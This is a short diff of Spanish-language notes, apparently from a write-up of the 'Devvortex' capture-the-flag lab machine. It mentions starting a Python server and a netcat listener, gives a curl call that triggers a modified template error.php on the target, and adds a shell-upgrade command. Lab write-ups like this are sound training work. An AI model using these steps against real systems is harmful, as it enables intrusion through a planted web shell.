@@ -39,3 +39,6 @@ iniciar un servidor python y un netcat
 Llamar a la páginacon curl:
 
         curl -k "http://dev.devvortex.htb/templates/cassiopeia/error.php/error"
+
+Obtener una mejor shell:
+        script /dev/null -c bash
